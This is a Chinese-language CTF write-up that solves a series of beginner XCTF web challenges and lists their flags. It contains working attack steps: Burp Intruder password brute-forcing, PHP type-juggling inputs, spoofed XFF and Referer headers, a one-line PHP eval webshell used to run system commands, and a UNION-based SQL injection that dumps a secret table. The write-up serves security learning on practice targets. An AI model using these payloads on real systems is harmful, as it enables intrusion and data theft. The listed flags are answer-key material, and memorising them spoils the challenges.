# Write-Up（Web部分）

## view_source

+ 打开网页，只看到一个大大的 “FLAG is not here” 的提示。
+ 题目的提示是 **查看源代码** ，因此直接在火狐浏览器中按下 **F12** ，即可看到源代码中有一行注释。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF（攻防世界）/WEB/view_source/1.png?raw=true)

+ 注释中的内容就是flag。
+ flag: **cyberpeace{2d6b553891b29fd9ed11a89127bade69}**



## robots

+ 看到题目，直接想到可能与 **robots.txt** 有关。
+ 不了解 [**robots协议**](https://baike.baidu.com/item/robots%E5%8D%8F%E8%AE%AE/2483797?fr=aladdin) 的百度一下。
+ 在题目 **URL** 的后面加上 `/robots.txt` ，查看网站的 **robots.txt**：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/robots/1.png?raw=true)

+ 发现 **robots.txt** 中禁止了 **f1ag_1s_h3re.php** 的显示：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/robots/1.png?raw=true)

+ 直接在原 **URL** 后面加上 `/f1ag_1s_h3re.php` 。
+ f1ag_1s_h3re.php 页面中的内容就是 flag 。
+ flag: **cyberpeace{c1d5ab0f1dc36f04d10beed108ca8345}**



## cookie

+ 点开网页，发现一句话： “你知道什么是cookie吗？”。
+ 果断 **F12** ，然后在 **存储（storage）** 一栏看到 **cookie** ，数据内容里有一栏 **look-here: "cookie.php"**。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/cookie/1.png?raw=true)

+ 于是在 **URL** 后面加上 `/cookie.php` ，发现跳转到另一个网页，网页上显示一句话： “See the http response”。
+ 于是再次 **F12** ，在 **网络（Network）** 一栏下方选择 **cookie.php** ，并观察右侧 **响应头** 的内容，看到一行 **flag: cyberpeace{e46eded4dad3ed1d66bf4cfdaf86c531}**

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/cookie/2.png?raw=true)

+ flag: **cyberpeace{e46eded4dad3ed1d66bf4cfdaf86c531}**



## backup

+ 点开网页，发现一句话： “你知道index.php的备份文件名吗？”。
+ 实话说，真的不记得了QAQ...
+ 开始瞎猜，什么 **.bak** ，**.phpbak**，发现都不对。
+ 无奈之下百度，发现是 **.php~** 或者 **.php.bak** 。
+ 前者不对，后者输入 **URL** 地址栏后会提示下载一个 **bak文件** 。
+ 下载下来用 **notepad++** 打开，然后阅读代码发现其中有一段 **php** 代码里面有flag：

```php+HTML
<html>
<head>
    <meta charset="UTF-8">
    <title>备份文件</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>你知道index.php的备份文件名吗？</h3>
<?php
$flag="Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}"
?>
</body>
</html>

```

+ flag: **Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}**



## disabled_button

+ 打开网页发现一个灰色的不能按的按钮，上面写着 “flag”。
+ 为了让他能按，按 **F12** ，发现这个按钮的 HTML 是这么写的：

```html
<input class="btn btn-default" disabled="" class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth">
```

+ 于是尝试在 `disabled=""` 里面加上 false 变成 `disabled="false"` ，但是按钮依然不能按。
+ 填进去各种值都不成功，索性删掉，于是就能点了...

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/disabled_button/1.png?raw=true)

+ 点下去即显示出一行 flag 。
+ flag: **cyberpeace{bf48a972642983285b427ee951f8a1d9}**



## weak auth

+ 打开网页看到一个登录页面。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/weak_auth/1.png?raw=true)

+ 一度以为是 **SQL注入** ，看提示发现应该不是—— “随手设了一个密码” 按时应该是弱口令可以爆破。
+ 先测试 **username** 是什么，直接点 **login** ，发现弹出一个提示框提示必须使用 **admin** 登录：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/weak_auth/2.png?raw=true)

+ 对于密码，打开 **burpsuite** ，考虑利用 **intruder** 爆破这个弱口令。
+ 首先设置 **burpsuite** 的 **proxy（代理）** ，**接口（interface）** 设为 **127.0.0.1:8080** 。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/weak_auth/3.png?raw=true)

+ 接着在 **firefox（火狐）浏览器** 的 **preference** -> **proxy** 中设置 **Manual proxy configuration（手动设置代理）**，**HTTP Proxy** 设为 **127.0.0.1** ，**Port** 设为 **8080**，与 burpsuite 中 代理的设置一致即可。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/weak_auth/4.png?raw=true)

+ 然后随便填写一个 username 和 password 以后，在 burpsuite 中把拦截到的页面 **Send to Intruder** ，然后在 **Intruder** 中的 **Payloads** 选项卡中设置 **Payload** 。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/weak_auth/5.png?raw=true)

+ 这个页面的 **Payload Sets** 有两个需要设置：

  + 第一个是 **username** ，直接在 **Payload type** 中选择 **Simple list** 即可；然后在 **Payload Options** 中添加唯一字段 **admin** 即可。

  ![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/weak_auth/6.png?raw=true)

  + 第二个是 **password** ，这个字段可以通过设定密码可能的字符范围和类型进行**暴力破解**，也可以准备一个**弱口令字典**爆破（能不能成功要看提供的字典是否正好包含了正确的密码）。在 **Payload type** 中选择 **Simple list** ；然后在 **Payload Options** 中使用 **load** 选项从弱口令字典中导入所有的弱口令字段即可。

  ![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/weak_auth/7.png?raw=true)

+ 设置完以后就可以开开心心的点下页面右上角的 **start attack** 按钮了。

+ 爆破过程长短与计算机的计算能力以及字典的大小有关（大概吧）... 爆破过程中注意观察弹出的窗口中的爆破状态，特别注意 **Length** 项。当某个 username 和 password 组合对应的 **Length** 长度与众不同时，说明这个 username 和 password 组合很可能就是正确的组合（图中显示 Length 与众不同的 username 为 **admin**，password 为 **123456**）

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/weak_auth/8.png?raw=true)

+ 在网页中使用上述的组合尝试登录，页面跳转到一个新的页面，即得到 flag。
+ flag: **cyberpeace{b0bc0057eb39e23d1c5a8e711370f66b}**



## simple_php

+ 听说 “php是最好的语言” ？[滑稽] [滑稽]
+ 打开网页就看到一坨写的很丑的 php 代码（好吧我 php 可能写的差不多也这样）...

```php
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){
    echo $flag1;
}
if(is_numeric($b)){
    exit();
}
if($b>1234){
    echo $flag2;
}
?>
```

+ 分析代码，大意是 flag 包括两段，分别由变量 `$flag1` 和 `$flag2` 接起来得到。
+ 要显示这两个变量，需要用 **GET 方法** 传变量 `a` 和变量 `b` 的参数。
+ 对于变量 `a` ，需要满足 `$a==0 and $a` ，看起来不合逻辑（ `a` 的值要为 0 ，又要 `a` 的值不是 `false`）。这里要利用 php 语言的特点——弱类型语言，php 中的 `==` 是比较运算符，不会检查条件表达式的类型是否相同（与 `===` 恒等运算符区别，`===` 会检查条件表达式类型是否相同） 。因此只需要在 **URL** 后面输入 `?a=0a` 即可，比较的时候 php 发现 0 后面的 a 不是数字，直接截断，只取前面的 0 。这样就使得 `echo $flag1; ` 语句能被执行。
+ 也可以输入 `?a=a` 或 `?a=[]` 同样能符合逻辑~
+ 对于变量 `b` ，要使其不满足 `is_numeric($b)` 的判断，又要使其满足 `$b>1234` 的判断。php 中 `is_numeric()` 函数是用来判断是否是数字和数字字符串的。因此同样用对变量 `a` 使用过的小伎俩，在 **URL** 后面输入 `?a=0a&b=1235a` 即可。php 会截去 1235 后面不是数字的 a 字符，但是却能将变量 `b` 判定为不是数字（所以你们还说 php 是世界上最好的语言吗？[滑稽] [滑稽]）。
+ 正确输入 URL 后得到完整的 flag 。
+ flag: **Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}**



## get_post

+ 打开网页，看到一行字 “请用GET方式提交一个名为a,值为1的变量”。

+ 直接在 **URL** 后面加上 `?a=1` 即可。

+ 回车后又出现一行字 “请再以POST方式随便提交一个名为b,值为2的变量”。

+ **POST方法** 无法像 GET 方法一样直接在地址栏修改 URL 得到。解决方法有两种：

  + 在火狐浏览器中安装插件 **hackbar** ，安装成功后按 **F12** ，可以看到导航栏的最后一项多了一个 **hackbar** 。此时先点击 **Load URL** ，然后再勾上 **Post data** 的勾选框，并在下方弹出的输入框中填上 `b=2`，最后点击 **Execute** 即可得到 flag。

  ![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/get_post/1.png?raw=true)

  + 使用 **Burpsuite** 。在使用 GET 方法收到显示了第二行字的新网页后，点击 **Send to Repeater** 。在 Repeater 中修改 Headers，把原来的 **GET** 改为 **POST** ，然后点击 **Send**，发现并没有得到 flag 。百度发现使用 POST 方法需要添加 **Content-Type** 和 **Content-Length** 字段，最后在 **raw** 中直接添加 `b=2` 才能成功。

  ![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/get_post/2.png?raw=true)

+ flag: **cyberpeace{c9b6fecf90fe60bc102f5f4b45e249f8}**



## xff_referer

+ 打开网页，发现一行很小的字 “ip地址必须为123.123.123.123” 。

+ 又要上 **Burpsuite** 了，用 Burpsuite 修改发送的数据，在 **Header** 中添加一行 `X-Forwarded-For: 123.123.123.123` ，使满足 IP 为 123.123.123.123 。

  > **X-Forwarded-For**（**XFF**）是用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 请求头字段。

+ 点击 **Send** 后发现多了一行 `<script>` 的内容：

```html
<script>
    document.getElementById("demo").innerHTML="必须来自https://www.google.com";</script>
```

+ 于是按照要求添加 **Referer** 的值：`Referer: https://www.google.com` ，即可得到 flag。

  > 当浏览器向 web 服务器发送请求的时候，一般会带上 Referer ，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。
  >
  > Referer 的正确英语拼法是 referrer 。由于早期 HTTP 规范的拼写错误，为了保持向后兼容就将错就错了。其它网络技术的规范企图修正此问题，使用正确拼法，所以拼法不统一。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/xff_referer/1.png?raw=true)

+ flag: **cyberpeace{36017c947d347900bf6bc21882924614}**



## webshell

+ 打开网页，看到如下内容：

  > ### 你会使用webshell吗？
  >
  > <?php @eval($_POST['shell']);?>

+ 【来自解题过后的百度】关于 webshell ：

  > + webshell 就是就是 web 的一个管理工具，可以对 web 服务器进行操作的权限，也叫 webadmin 。webshell 一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于 webshell 的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的 webshell 上传到 web 服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。
  >
  > + webshell 根据脚本可以分为 PHP 脚本， ASP 脚本，也有基于 .NET 的脚本和 JSP 脚本。在国外，还有用 Python 脚本语言写的动态网页，故也有与之相关的 webshell 。
  >   根据功能也分为大马与小马，小马通常指的一句话木马，例如：`<%eval request(“pass”)%>` 通常把这句话写入一个文档里面，然后文件名改成 xx.asp 。然后传到服务器上面。这里 eval 方法将 request(“pass”) 转换成代码执行，request 函数的作用是应用外部文件，这相当于一句话木马的客户端配置。

+ 于是 **F12** ，用 **hackbar** 先点击 **Load URL** 再勾上 **Post data** 勾选框，然后开始倒腾...

+ ... （以下省略 N 多无效操作...）

+ 在 Post data 下面的输入框中输入 `shell=print_r(getcwd());` 在页面上打印出当前页面对应的 html 文件所在的目录。

  > getcwd函数：获取当前工作目录

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/webshell/1.png?raw=true)

+ 页面显示当前目录为 `/var/www/html`，于是输入 `shell=print_r(scandir("/var/www/html"));` 在页面上打印出当前页面所在工作目录下的所有文件（及目录）。

  > scandir函数：列出指定路径中的文件和目录

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/webshell/2.png?raw=true)

+ 页面显示内容为 `Array ( [0] => . [1] => .. [2] => flag.txt [3] => index.php ) <?php ` 。发现当前目录下隐藏着一个 **flag.txt** 文件，于是直接在 **URL** 后面加上 `/flag.txt` 即可访问 **flag.txt** 文件，得到 flag 。
+ 也可以输入 `shell=system("ls");` 在页面上打印出当前页面对应的 html 文件所在的目录，然后再输入 `shell=system('cat flag.txt');` 在页面上直接打印出 **flag.txt** 的内容。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/webshell/3.png?raw=true)

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/webshell/4.png?raw=true)

+ ... （心态崩了，看来我的 PHP 需要回炉重学QAQ）
+ 这里最省事的方法其实是用工具 **“中国菜刀”** 或者 **“中国蚁剑”** ... 涨姿势了QAQ
+ flag: **cyberpeace{1314db684c1a2094dd83e1f495920623}**



## NewsCenter

+ 打开网页看到一个很朴素的页面，类似一个普通的新闻查询页面，页面正中间有一个搜索框：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/Hacker_News.png?raw=true)

+ 在搜索框中输入任意内容，例如输入 <code>1</code> 发现除了底下 **News** 部分显示出包含字段 <code>1</code> 的新闻以外，什么都没有发生，没有 **alert弹窗** 之类的。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/01.png?raw=true)

+ 猜测可能是 **SQL注入** ，首先尝试如下语句注入 `' and 1 = 1#` 什么都没发生...
+ 修改注入语句如下 `' and 1 = 2#` ，News部分变为空白，显然该 SQL 语句有效。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/02.png?raw=true)

+ 利用union联合注入试探该sql查询返回的列数，首先尝试 1 列 `' and 1 = 2 union select 1#` ，页面跳转显示无法访问，说明不是 1 列。

+ `' and 1 = 2 union select 1, 2#` 同样失败。

+ `' and 1 = 2 union select 1, 2, 3#` 时，News部分出现内容

  > **2**
  >
  > 3

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)

+ 于是进一步查询数据库中所有的数据表名 `' and 1 = 2 union select 1, TABLE_SCHEMA, TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #` ，发现一个 **secret_table** 表：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/05.png?raw=true)

+ 查询 **secret_table** 表中的所有字段 `' and 1 = 2 union select 1, 2, COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'secret_table' #` ，发现表中字段如下：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/06.png?raw=true)

+ **fl4g** 字段非常引人注目，猜测可能其中隐藏着 **flag**，因此进一步查询 **fl4g** 的内容 `' and 1 = 2 union select 1, 2, fl4g from secret_table #`
+ 成功得到 flag 。
+ flag: **QCTF{sq1_inJec7ion_ezzz}**

